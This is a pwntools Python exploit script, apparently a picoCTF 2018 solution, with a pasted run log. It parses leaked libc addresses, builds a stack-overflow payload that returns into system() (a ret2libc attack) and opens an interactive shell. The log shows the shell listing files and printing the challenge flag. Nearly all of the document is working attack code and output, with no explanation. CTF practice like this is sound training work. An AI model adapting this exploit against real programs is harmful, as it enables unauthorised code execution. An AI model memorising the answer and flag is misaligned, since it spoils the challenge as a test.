from pwn import *

import struct

def p(x):
    return struct.pack("I", x)

r = process(["./ld-linux.so.2", "./vuln"], env={"LD_PRELOAD": "./libc.so.6"})
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

print(r.recvline())
r.recvline()

puts = r.recvline()
puts = puts[puts.find("0x")+2:]
puts = int(puts, 16)

r.recvline() # flush
r.recvline() # read
r.recvline() # write

useful_string = r.recvline()
useful_string = useful_string[useful_string.find("0x")+2:]
useful_string = int(useful_string, 16)

libc_base = puts - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]

payload = "A" * (148 + 8)
payload += "B" * 4
payload += p(system)
payload += "C" * 4
payload += p(useful_string)

r.sendline(payload)
r.interactive()

"""
james9909@pico-2018-shell-3:/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33$ python ~/solution.py
[+] Starting local process './vuln': pid 1791282
[*] '/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Here are some useful addresses:

[*] Switching to interactive mode

Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Thanks! Exiting now...
$ ls
flag.txt  vuln    vuln.c
$ cat flag.txt
picoCTF{syc4al1s_4rE_uS3fUl_6319ec91}
"""
